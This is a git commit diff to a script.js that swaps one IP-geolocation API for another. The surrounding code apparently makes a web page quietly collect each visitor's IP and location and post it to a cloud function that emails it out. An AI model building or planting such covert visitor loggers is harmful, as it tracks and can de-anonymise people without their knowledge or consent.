1c9d2096adbb53fec812fe28fed9a31b4d121e90
Kisametoba <47195852+Kisametoba@users.noreply.github.com>
2019-01-30 20:00:21 -0300

    Changiing IP API

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-$.getJSON('http://www.geoplugin.net/json.gp?jsoncallback=?', function(data) {
+$.getJSON('https://ipapi.co/json/', function(data) {
   const body = JSON.stringify(data, null, 2);
   $.post("https://us-central1-ip-sender-email.cloudfunctions.net/enviarEmail", body, function (data) {
     console.log(data);
